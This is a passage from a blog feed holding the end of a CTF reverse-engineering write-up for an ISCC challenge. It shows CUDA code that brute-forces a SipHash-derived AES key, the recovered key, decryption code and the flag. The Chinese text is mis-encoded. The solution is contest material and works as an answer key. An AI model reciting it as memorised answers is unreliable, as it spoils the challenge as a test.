class="number">0</span>];</span><br><span class="line">state[<span class="number">2</span>][<span class="number">3</span>] = temp[<span class="number">2</span>][<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">state[<span class="number">3</span>][<span class="number">0</span>] = temp[<span class="number">3</span>][<span class="number">1</span>];</span><br><span class="line">state[<span class="number">3</span>][<span class="number">1</span>] = temp[<span class="number">3</span>][<span class="number">2</span>];</span><br><span class="line">state[<span class="number">3</span>][<span class="number">2</span>] = temp[<span class="number">3</span>][<span class="number">3</span>];</span><br><span class="line">state[<span class="number">3</span>][<span class="number">3</span>] = temp[<span class="number">3</span>][<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">__device__ <span class="type">uint8_t</span> <span class="title">GMul</span><span class="params">(<span class="type">uint8_t</span> u, <span class="type">uint8_t</span> v)</span> </span>&#123;</span><br><span class="line"><span class="type">uint8_t</span> p = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; ++i) &#123;</span><br><span class="line"><span class="keyword">if</span> (u &amp; <span class="number">0x01</span>) &#123;</span><br><span class="line">p ^= v;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> flag = (v &amp; <span class="number">0x80</span>);</span><br><span class="line">v &lt;&lt;= <span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span> (flag) &#123;</span><br><span class="line">v ^= <span class="number">0x1B</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">u &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">__device__ <span class="type">int</span> <span class="title">invMixColumns</span><span class="params">(<span class="type">uint8_t</span>(*state)[<span class="number">4</span>])</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="type">uint8_t</span> M[<span class="number">4</span>][<span class="number">4</span>] = &#123; &#123;<span class="number">0x0E</span>, <span class="number">0x0B</span>, <span class="number">0x0D</span>, <span class="number">0x09</span>&#125;,</span><br><span class="line">   &#123;<span class="number">0x09</span>, <span class="number">0x0E</span>, <span class="number">0x0B</span>, <span class="number">0x0D</span>&#125;,</span><br><span class="line">   &#123;<span class="number">0x0D</span>, <span class="number">0x09</span>, <span class="number">0x0E</span>, <span class="number">0x0B</span>&#125;,</span><br><span class="line">   &#123;<span class="number">0x0B</span>, <span class="number">0x0D</span>, <span class="number">0x09</span>, <span class="number">0x0E</span>&#125; &#125;;</span><br><span class="line"><span class="type">uint8_t</span> tmp[<span class="number">4</span>][<span class="number">4</span>]&#123;&#125;;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; ++i) &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; ++j) &#123;</span><br><span class="line">tmp[i][j] = state[i][j];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; ++i) &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; ++j) &#123;</span><br><span class="line">state[i][j] =</span><br><span class="line"><span class="built_in">GMul</span>(M[i][<span class="number">0</span>], tmp[<span class="number">0</span>][j])</span><br><span class="line">^ <span class="built_in">GMul</span>(M[i][<span class="number">1</span>], tmp[<span class="number">1</span>][j])</span><br><span class="line">^ <span class="built_in">GMul</span>(M[i][<span class="number">2</span>], tmp[<span class="number">2</span>][j])</span><br><span class="line">^ <span class="built_in">GMul</span>(M[i][<span class="number">3</span>], tmp[<span class="number">3</span>][j]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">__device__ <span class="type">int</span> <span class="title">aesDecrypt</span><span class="params">(<span class="type">const</span> <span class="type">uint8_t</span>* key, <span class="type">uint32_t</span> keyLen, <span class="type">const</span> <span class="type">uint8_t</span>* ct, <span class="type">uint8_t</span>* pt, <span class="type">uint32_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> &#123;</span><br><span class="line"><span class="type">uint32_t</span> eK[<span class="number">44</span>]&#123;&#125;, dK[<span class="number">44</span>]&#123;&#125;;</span><br><span class="line"><span class="type">int</span> Nr;</span><br><span class="line">&#125;AesKey;</span><br><span class="line"></span><br><span class="line">AesKey aesKey;</span><br><span class="line"><span class="type">uint8_t</span>* pos = pt;</span><br><span class="line"></span><br><span class="line"><span class="type">uint8_t</span> state[<span class="number">4</span>][<span class="number">4</span>];</span><br><span class="line"></span><br><span class="line"><span class="built_in">keyExpansion</span>(key, <span class="number">16</span>, &amp;aesKey);</span><br><span class="line"><span class="type">const</span> <span class="type">uint32_t</span>* rk = aesKey.dK;</span><br><span class="line"></span><br><span class="line"><span class="built_in">loadStateArray</span>(state, ct);</span><br><span class="line"><span class="built_in">addRoundKey</span>(state, rk);</span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> unroll</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">rk += <span class="number">4</span>;</span><br><span class="line"><span class="built_in">invShiftRows</span>(state);</span><br><span class="line"><span class="built_in">invSubBytes</span>(state);</span><br><span class="line"><span class="comment">// è§£å¯†åŒæ ·äº¤æ¢addRoundKeyå’ŒinvMixColumnsçš„è°ƒç”¨é¡ºåº</span></span><br><span class="line"><span class="built_in">invMixColumns</span>(state);</span><br><span class="line"><span class="built_in">addRoundKey</span>(state, rk);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">invSubBytes</span>(state);</span><br><span class="line"><span class="built_in">invShiftRows</span>(state);</span><br><span class="line"><span class="built_in">addRoundKey</span>(state, rk + <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">storeStateArray</span>(state, pos);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _le64toh(x) ((uint64_t)(x))</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ROTATE(x, b) (uint64_t)( ((x) <span class="string">&lt;&lt; (b)) | ( (x) &gt;</span>&gt; (64 - (b))) )</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HALF_ROUND(a,b,c,d,s,t)\</span></span><br><span class="line"><span class="meta">a += b; c += d;\</span></span><br><span class="line"><span class="meta">b = ROTATE(b, s) ^ a;\</span></span><br><span class="line"><span class="meta">d = ROTATE(d, t) ^ c;\</span></span><br><span class="line"><span class="meta">a = ROTATE(a, 32);</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DOUBLE_ROUND(v0,v1,v2,v3)\</span></span><br><span class="line"><span class="meta">HALF_ROUND(v0,v1,v2,v3,13,16);\</span></span><br><span class="line"><span class="meta">HALF_ROUND(v2,v1,v0,v3,17,21);\</span></span><br><span class="line"><span class="meta">HALF_ROUND(v0,v1,v2,v3,13,16);\</span></span><br><span class="line"><span class="meta">HALF_ROUND(v2,v1,v0,v3,17,21);</span></span><br><span class="line"></span><br><span class="line"><span class="function">__device__ <span class="type">uint64_t</span> <span class="title">siphash24_gpu</span><span class="params">(<span class="type">const</span> <span class="type">void</span>* src, <span class="type">unsigned</span> <span class="type">long</span> src_sz, <span class="type">const</span> <span class="type">char</span> key[<span class="number">16</span>])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">const</span> <span class="type">uint64_t</span>* _key = (<span class="type">uint64_t</span>*)key;</span><br><span class="line"><span class="type">uint64_t</span> k0 = _le64toh(_key[<span class="number">0</span>]);</span><br><span class="line"><span class="type">uint64_t</span> k1 = _le64toh(_key[<span class="number">1</span>]);</span><br><span class="line"><span class="type">uint64_t</span> b = (<span class="type">uint64_t</span>)src_sz &lt;&lt; <span class="number">56</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">uint64_t</span>* in = (<span class="type">uint64_t</span>*)src;</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> v0 = k0 ^ <span class="number">0x102030405060708ULL</span>;</span><br><span class="line"><span class="type">uint64_t</span> v1 = k1 ^ <span class="number">0x90a0b0c0d0e0f00ULL</span>;</span><br><span class="line"><span class="type">uint64_t</span> v2 = k0 ^ k1 ^ <span class="number">0x123456789abcdefULL</span>;</span><br><span class="line"><span class="type">uint64_t</span> v3 = k1 ^ k0 ^ <span class="number">0x4953434343435349ULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (src_sz &gt;= <span class="number">8</span>) &#123;</span><br><span class="line"><span class="type">uint64_t</span> mi = _le64toh(*in);</span><br><span class="line">in += <span class="number">1</span>; src_sz -= <span class="number">8</span>;</span><br><span class="line">v3 ^= mi;</span><br><span class="line"><span class="built_in">DOUBLE_ROUND</span>(v0, v1, v2, v3);</span><br><span class="line">v0 ^= mi;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> t = <span class="number">0</span>; <span class="type">uint8_t</span>* pt = (<span class="type">uint8_t</span>*)&amp;t; <span class="type">uint8_t</span>* m = (<span class="type">uint8_t</span>*)in;</span><br><span class="line"><span class="keyword">if</span> (src_sz == <span class="number">7</span>)</span><br><span class="line">&#123;</span><br><span class="line">pt[<span class="number">6</span>] = m[<span class="number">6</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (src_sz == <span class="number">6</span>)</span><br><span class="line">&#123;</span><br><span class="line">pt[<span class="number">5</span>] = m[<span class="number">5</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (src_sz == <span class="number">5</span>)</span><br><span class="line">&#123;</span><br><span class="line">pt[<span class="number">4</span>] = m[<span class="number">4</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (src_sz == <span class="number">4</span>)</span><br><span class="line">&#123;</span><br><span class="line">*((<span class="type">uint32_t</span>*)&amp;pt[<span class="number">0</span>]) = *((<span class="type">uint32_t</span>*)&amp;m[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (src_sz == <span class="number">3</span>)</span><br><span class="line">&#123;</span><br><span class="line">pt[<span class="number">2</span>] = m[<span class="number">2</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (src_sz == <span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line">pt[<span class="number">1</span>] = m[<span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (src_sz == <span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">pt[<span class="number">0</span>] = m[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line">b |= _le64toh(t);</span><br><span class="line"></span><br><span class="line">v3 ^= b;</span><br><span class="line"><span class="built_in">DOUBLE_ROUND</span>(v0, v1, v2, v3);</span><br><span class="line">v0 ^= b; v2 ^= <span class="number">0xff</span>;</span><br><span class="line"><span class="built_in">DOUBLE_ROUND</span>(v0, v1, v2, v3);</span><br><span class="line"><span class="built_in">DOUBLE_ROUND</span>(v0, v1, v2, v3);</span><br><span class="line"><span class="keyword">return</span> (v0 ^ v1) ^ (v2 ^ v3);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">__global__ <span class="type">void</span> <span class="title">crack</span><span class="params">(<span class="type">uint8_t</span>* KeyOut, <span class="type">bool</span>* found, <span class="type">uint64_t</span> offset)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// æ˜¯å¦æ‰¾åˆ°</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">atomicOr</span>((<span class="type">int</span>*)found,<span class="number">0</span>))</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> tid = blockIdx.x * blockDim.x + threadIdx.x;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (tid &gt; <span class="number">94ULL</span> * <span class="number">95ULL</span> * <span class="number">0xffffULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">uint8_t</span> rndList[<span class="number">16</span>];</span><br><span class="line"><span class="type">uint8_t</span> hash_plaintext[<span class="number">9</span>];</span><br><span class="line"><span class="type">uint8_t</span> key[<span class="number">16</span>];</span><br><span class="line"><span class="type">uint8_t</span> out[<span class="number">16</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> CHAR_RANGE = <span class="number">95</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> BASE_CHAR = <span class="number">33</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// é€šè¿‡tidç”Ÿæˆå½“å‰æ•°å€¼</span></span><br><span class="line"><span class="type">int</span> rnd_v = tid % <span class="number">0xFFFF</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> char_pos = tid / <span class="number">0xFFFF</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> c3 = BASE_CHAR + (char_pos % CHAR_RANGE);</span><br><span class="line">char_pos /= CHAR_RANGE;</span><br><span class="line"><span class="type">int</span> c2 = BASE_CHAR + (char_pos % CHAR_RANGE);</span><br><span class="line">char_pos /= CHAR_RANGE;</span><br><span class="line"><span class="type">int</span> c1 = BASE_CHAR + offset;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (c1 &lt; <span class="number">127</span> &amp;&amp; c2 &lt; <span class="number">127</span> &amp;&amp; c3 &lt; <span class="number">127</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// ç”Ÿæˆ01æ’åˆ—</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> unroll</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">rndList[i] = i + ((rnd_v &gt;&gt; (<span class="number">15</span> - i)) &amp; <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> unroll</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">9</span>; i++) &#123;</span><br><span class="line">hash_plaintext[i] = hash_plaintext_template[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ISCC&#123;$c1$c2$c3&#125;</span></span><br><span class="line">hash_plaintext[<span class="number">5</span>] = c1;</span><br><span class="line">hash_plaintext[<span class="number">6</span>] = c2;</span><br><span class="line"></span><br><span class="line">hash_plaintext[<span class="number">7</span>] = c3;</span><br><span class="line"><span class="comment">// hash</span></span><br><span class="line"><span class="type">uint64_t</span> hash = <span class="built_in">siphash24_gpu</span>(hash_plaintext, <span class="number">9</span>, (<span class="type">const</span> <span class="type">char</span>*)rndList);</span><br><span class="line"></span><br><span class="line"><span class="comment">// ç”¨hashæ‰©å±•ç”ŸæˆAESå¯†é’¥</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> unroll</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">key[i] = (<span class="type">uint8_t</span>)(hash &gt;&gt; (i * <span class="number">8</span> &amp; <span class="number">0x3f</span>));</span><br><span class="line">key[i * <span class="number">2</span> + <span class="number">1</span>] = (<span class="type">uint8_t</span>)(hash &gt;&gt; (i * <span class="number">-8</span> + <span class="number">0x38</span> &amp; <span class="number">0x3f</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// AESè§£å¯†</span></span><br><span class="line"><span class="built_in">aesDecrypt</span>(key, <span class="number">16</span>, EncFlag, out, <span class="number">16</span>);</span><br><span class="line"><span class="keyword">if</span> (out[<span class="number">0</span>] == <span class="string">&#x27;I&#x27;</span> &amp;&amp; out[<span class="number">1</span>] == <span class="string">&#x27;S&#x27;</span> &amp;&amp; out[<span class="number">2</span>] == <span class="string">&#x27;C&#x27;</span> &amp;&amp; out[<span class="number">3</span>] == <span class="string">&#x27;C&#x27;</span> &amp;&amp; out[<span class="number">4</span>] == <span class="string">&#x27;&#123;&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">atomicExch</span>((<span class="type">int</span>*)found, <span class="number">1</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> unroll</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++) &#123;</span><br><span class="line">KeyOut[i] = key[i];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">uint8_t</span> EncFlag_user[]&#123; <span class="number">0x9f</span>, <span class="number">0xb3</span>, <span class="number">0xb8</span>, <span class="number">0x2f</span>, <span class="number">0x23</span>, <span class="number">0x82</span>, <span class="number">0x19</span>, <span class="number">0x7d</span>, <span class="number">0xe7</span>, <span class="number">0x2a</span>, <span class="number">0x8b</span>, <span class="number">0x20</span>, <span class="number">0x0c</span>, <span class="number">0x5b</span>, <span class="number">0x79</span>, <span class="number">0x72</span>, <span class="number">0xf7</span>, <span class="number">0x07</span>, <span class="number">0xa0</span>, <span class="number">0x63</span>, <span class="number">0x53</span>, <span class="number">0x99</span>, <span class="number">0x49</span>, <span class="number">0xc2</span>, <span class="number">0x51</span>, <span class="number">0xde</span>, <span class="number">0x86</span>, <span class="number">0x1b</span>, <span class="number">0x87</span>, <span class="number">0x2f</span>, <span class="number">0x31</span>, <span class="number">0x6b</span>, <span class="number">0xbc</span>, <span class="number">0xfa</span>, <span class="number">0x5b</span>, <span class="number">0x9a</span>, <span class="number">0x6b</span>, <span class="number">0x12</span>, <span class="number">0x16</span>, <span class="number">0x8b</span>, <span class="number">0x31</span>, <span class="number">0xf6</span>, <span class="number">0x6c</span>, <span class="number">0x1d</span>, <span class="number">0x94</span>, <span class="number">0xba</span>, <span class="number">0x2f</span>, <span class="number">0x37</span> &#125;;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">48</span>; i++)</span><br><span class="line">EncFlag_user[i] ^= <span class="number">0x10</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">cudaMemcpyToSymbol</span>(S, S_user, <span class="number">256</span>, <span class="number">0</span>, cudaMemcpyHostToDevice);</span><br><span class="line"></span><br><span class="line"><span class="built_in">cudaMemcpyToSymbol</span>(inv_S, inv_S_user, <span class="number">256</span>, <span class="number">0</span>, cudaMemcpyHostToDevice);</span><br><span class="line"></span><br><span class="line"><span class="built_in">cudaMemcpyToSymbol</span>(EncFlag, EncFlag_user, <span class="number">16</span>, <span class="number">0</span>, cudaMemcpyHostToDevice);</span><br><span class="line"></span><br><span class="line"><span class="built_in">cudaMemcpyToSymbol</span>(rcon, rcon_user, <span class="number">40</span>, <span class="number">0</span>, cudaMemcpyHostToDevice);</span><br><span class="line"></span><br><span class="line"><span class="built_in">cudaMemcpyToSymbol</span>(hash_plaintext_template, <span class="string">&quot;ISCC&#123;xxx&#125;&quot;</span>, <span class="number">9</span>, <span class="number">0</span>, cudaMemcpyHostToDevice);</span><br><span class="line"></span><br><span class="line"><span class="type">uint8_t</span> resultKey[<span class="number">16</span>]&#123;&#125;;</span><br><span class="line"><span class="type">bool</span> found_ = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">uint8_t</span>* KeyOut;</span><br><span class="line"><span class="type">bool</span>* found;</span><br><span class="line"></span><br><span class="line"><span class="built_in">cudaMalloc</span>(&amp;KeyOut, <span class="number">16</span> * <span class="built_in">sizeof</span>(<span class="type">uint8_t</span>));</span><br><span class="line"><span class="built_in">cudaMalloc</span>(&amp;found, <span class="number">1</span> * <span class="built_in">sizeof</span>(<span class="type">bool</span>));</span><br><span class="line"><span class="built_in">cudaMemset</span>(found, <span class="number">0</span>, <span class="built_in">sizeof</span>(<span class="type">bool</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">// ç¬¬ä¸€ä¸ªå­—èŠ‚åœ¨ç”¨æˆ·å±‚å¾ªç¯</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">94</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Tring crack the block %d\n&quot;</span>, i);</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">uint64_t</span> TOTAL_COMBINATIONS = <span class="number">94ULL</span> * <span class="number">95ULL</span> * <span class="number">0xffffULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> blockSize = <span class="number">256</span>;</span><br><span class="line"><span class="type">uint64_t</span> gridSize = (TOTAL_COMBINATIONS + blockSize - <span class="number">1</span>) / blockSize;</span><br><span class="line">crack &lt;&lt; &lt;gridSize, blockSize &gt;&gt; &gt; (KeyOut, found,i);</span><br><span class="line"><span class="built_in">cudaDeviceSynchronize</span>();</span><br><span class="line"></span><br><span class="line"><span class="built_in">cudaMemcpy</span>(&amp;found_, found, <span class="number">1</span>, cudaMemcpyDeviceToHost);</span><br><span class="line"><span class="keyword">if</span> (found_)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cudaMemcpy</span>(resultKey, KeyOut, <span class="number">16</span>, cudaMemcpyDeviceToHost);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Found key: &quot;</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;0x%02x,&quot;</span>, resultKey[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="built_in">cudaMemset</span>(found, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;No result.\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">cudaFree</span>(KeyOut);</span><br><span class="line"><span class="built_in">cudaFree</span>(found);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="è·å¾—å¯†é’¥è§£å¯†"><a href="#è·å¾—å¯†é’¥è§£å¯†" class="headerlink" title="è·å¾—å¯†é’¥è§£å¯†"></a>è·å¾—å¯†é’¥è§£å¯†</h1><p>CUDAçˆ†ç ´å¾—åˆ°å¯†é’¥ä¸ºï¼š</p><blockquote><p>0x54,0x8e,0x7a,0x3a,0x13,0x57,0xf3,0x00,0x00,0x3a,0x00,0x7a,0x00,0x8e,0x00,0x54</p></blockquote><p><img src="/2025/05/25/ISCC-Enigma/image-18.png" alt="alt text"></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">uint8_t</span> EncFlag[]&#123; <span class="number">0x9f</span>, <span class="number">0xb3</span>, <span class="number">0xb8</span>, <span class="number">0x2f</span>, <span class="number">0x23</span>, <span class="number">0x82</span>, <span class="number">0x19</span>, <span class="number">0x7d</span>, <span class="number">0xe7</span>, <span class="number">0x2a</span>, <span class="number">0x8b</span>, <span class="number">0x20</span>, <span class="number">0x0c</span>, <span class="number">0x5b</span>, <span class="number">0x79</span>, <span class="number">0x72</span>, <span class="number">0xf7</span>, <span class="number">0x07</span>, <span class="number">0xa0</span>, <span class="number">0x63</span>, <span class="number">0x53</span>, <span class="number">0x99</span>, <span class="number">0x49</span>, <span class="number">0xc2</span>, <span class="number">0x51</span>, <span class="number">0xde</span>, <span class="number">0x86</span>, <span class="number">0x1b</span>, <span class="number">0x87</span>, <span class="number">0x2f</span>, <span class="number">0x31</span>, <span class="number">0x6b</span>, <span class="number">0xbc</span>, <span class="number">0xfa</span>, <span class="number">0x5b</span>, <span class="number">0x9a</span>, <span class="number">0x6b</span>, <span class="number">0x12</span>, <span class="number">0x16</span>, <span class="number">0x8b</span>, <span class="number">0x31</span>, <span class="number">0xf6</span>, <span class="number">0x6c</span>, <span class="number">0x1d</span>, <span class="number">0x94</span>, <span class="number">0xba</span>, <span class="number">0x2f</span>, <span class="number">0x37</span> &#125;;</span><br><span class="line"><span class="type">uint8_t</span> AesKey[<span class="number">16</span>]&#123; <span class="number">0x54</span>,<span class="number">0x8E</span>,<span class="number">0x7A</span>,<span class="number">0x3A</span>,<span class="number">0x13</span>,<span class="number">0x57</span>,<span class="number">0xF3</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x3A</span>,<span class="number">0x00</span>,<span class="number">0x7A</span>,<span class="number">0x00</span>,<span class="number">0x8E</span>,<span class="number">0x00</span>,<span class="number">0x54</span> &#125;;</span><br><span class="line"><span class="type">uint8_t</span> Flag[<span class="number">48</span>]&#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">48</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">EncFlag[i] ^= <span class="number">0x10</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">48</span>; i+=<span class="number">16</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">aesDecrypt</span>(AesKey, <span class="number">16</span>, EncFlag + i, Flag + i, <span class="number">16</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%.48s\n&quot;</span>, Flag);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è§£å¯†å¾—åˆ°Flagï¼š</p><p><strong>ISCC{A35_128_51pH4sh_2-4_CTF_K3y3d_H4sh}</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h1&gt;&lt;p&gt;è¿™é¢˜å½“æ—¶èµ›ä¸­å¾ˆæ—©å°±å†™å‡ºçˆ†ç ´è§£å¯†è„šæœ¬äº†ï¼Œä½†æ˜¯ä¸€ç›´æ²¡çˆ†å‡ºæ¥ï¼Œèµ›åå’Œå‡ºé¢˜äººå’¨è¯¢å‘ç°æ˜¯å¯†æ–‡é”™äº†ï¼Œå¹¶ä¸”å‘ç°å…¶å®æ˜¯ç¨‹åºæœ¬èº«å‡ºé”™äº†ï¼Œxor 0x10çš„ä»£ç </summary>
      
    
    
    
    
    <category term="CTFæ¯”èµ›" scheme="https://tkazer.github.io/tags/CTF%E6%AF%94%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>ACTF2025 Reverse Deeptx WP</title>
    <link href="https://tkazer.github.io/2025/04/27/ACTF-Deeptx/"/>
    <id>https://tkazer.github.io/2025/04/27/ACTF-Deeptx/</id>
    <published>2025-04-27T12:22:12.000Z</published>
    <updated>2025-04-27T12:56:34.530Z</updated>
    
